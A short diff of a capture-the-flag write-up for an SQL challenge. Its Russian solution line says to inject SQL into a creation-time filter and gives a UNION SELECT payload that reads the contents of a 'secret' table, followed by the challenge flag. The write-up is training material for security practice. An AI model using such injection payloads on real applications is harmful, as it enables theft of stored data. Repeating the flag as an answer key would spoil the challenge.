@@ -12,7 +12,8 @@ How confident do you feel in your SQL?
 
 ## Solution
 Вставьте SQL иньекцию в строку для фильтрации по времени создания 
-' UNION SELECT 12, content, content, NULL from secret --
+
+>' UNION SELECT 12, content, content, NULL from secret --
 
 ## Flag 
 HITS{FfFflagg1asAsaaaa}
